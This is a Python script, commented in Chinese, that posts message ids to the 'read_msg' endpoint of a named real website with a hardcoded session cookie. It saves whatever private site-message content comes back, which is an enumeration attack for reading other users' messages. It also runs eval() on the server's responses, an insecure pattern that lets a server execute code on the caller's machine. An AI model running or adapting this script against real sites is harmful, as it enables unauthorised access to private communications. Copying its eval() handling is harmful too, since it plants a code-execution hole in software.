#  encoding=utf-8

import http.client as http
import urllib
import threading
import time
import random
import math


# 测试的服务器 + 端口 （有些大网站会认定你是攻击并且重置你的请求，比如baidu.com）
SERVER_NAME = "www.langsspt.com"
# 访问的页面
URL = '/index.php/Users/read_msg'

headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 \
                    (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36',
        'Cookie': '__cfduid=d1ae98ecef2f1d6aa9651fd439f59b6dc1473424968; \
                    PHPSESSID=eie5820b78h6eqd8r62gmhspj2; \
                    ktime_20160611/www.langsspt.com=-2; \
                    CNZZDATA1259850767=1720412073-1473336634-%7C1474193762',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
res = open('result1.txt', 'w')

def test_start(i):
    global headers
    try:
        test_data = {'id': i}
        test_data_encode = urllib.parse.urlencode(test_data)
        conn = http.HTTPConnection(SERVER_NAME)
        conn.request("POST", URL, test_data_encode, headers)
        result = conn.getresponse()
        if result.status == 200:
            res_body = result.read().decode()
            if 'content' in res_body:
                print(res_body)
                body = urllib.parse.unquote(eval(res_body)["content"])
                res.write(str(i)+'# '+eval(res_body)["time"]+':'+body+'\n\n')
            else:
                print('没有找到第',i,'封站内信')
        else:
            print('status:', result.status)
        conn.close()
    except Exception as e:
        print('获取第',i,'封站内信失败',e)

test_start(1080)

res.close()